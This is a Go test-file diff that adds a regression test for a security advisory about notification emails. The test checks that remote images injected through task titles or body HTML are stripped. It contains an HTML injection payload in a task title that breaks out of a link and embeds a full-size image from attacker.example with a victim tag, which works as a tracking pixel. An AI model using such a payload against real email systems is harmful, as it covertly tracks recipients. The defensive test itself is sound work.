@@ -711,3 +711,55 @@ func TestConversationalMail(t *testing.T) {
 		assert.Contains(t, headerLine1, "(Project &gt; Task) #1")
 	})
 }
+
+// Regression test for GHSA-2vr2-r3qw-rjvq: a user-controlled task title (or comment
+// or description) must not be able to smuggle a remote image into a notification
+// email, where it would act as a tracking pixel. Inline data-URI avatars and normal
+// links must keep working.
+func TestNotificationEmailStripsRemoteImages(t *testing.T) {
+	const remoteSrc = "https://attacker.example/track.png?u=victim"
+
+	t.Run("remote image injected via task title in header is stripped", func(t *testing.T) {
+		payloadTitle := `</a><img src="` + remoteSrc + `" style="position:absolute;width:100%;height:100%"><a>normal title`
+		header := CreateConversationalHeader("", "attacker left a comment", "https://example.com/task/1", "Project", "#1", payloadTitle)
+
+		mailOpts, err := RenderMail(NewMail().
+			Conversational().
+			Subject("Test").
+			HeaderLine(header).
+			Action("View Task", "https://example.com/task/1"), "en")
+		require.NoError(t, err)
+
+		assert.NotContains(t, mailOpts.HTMLMessage, remoteSrc)
+		assert.NotContains(t, mailOpts.HTMLMessage, "attacker.example")
+		// The benign text is still delivered, and the legitimate task link survives.
+		assert.Contains(t, mailOpts.HTMLMessage, "normal title")
+		assert.Contains(t, mailOpts.HTMLMessage, `href="https://example.com/task/1"`)
+	})
+
+	t.Run("remote image in body content is stripped", func(t *testing.T) {
+		mailOpts, err := RenderMail(NewMail().
+			Conversational().
+			Subject("Test").
+			HTML(`<p>hi</p><img src="`+remoteSrc+`">`).
+			Action("View Task", "https://example.com/task/1"), "en")
+		require.NoError(t, err)
+
+		assert.NotContains(t, mailOpts.HTMLMessage, remoteSrc)
+		assert.Contains(t, mailOpts.HTMLMessage, "hi")
+	})
+
+	t.Run("inline data-URI avatar is preserved", func(t *testing.T) {
+		const avatar = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
+		header := CreateConversationalHeader(avatar, "alice left a comment", "https://example.com/task/1", "Project", "#1", "Task")
+
+		mailOpts, err := RenderMail(NewMail().
+			Conversational().
+			Subject("Test").
+			HeaderLine(header).
+			Action("View Task", "https://example.com/task/1"), "en")
+		require.NoError(t, err)
+
+		assert.Contains(t, mailOpts.HTMLMessage, "data:image/png;base64,")
+	})
+}
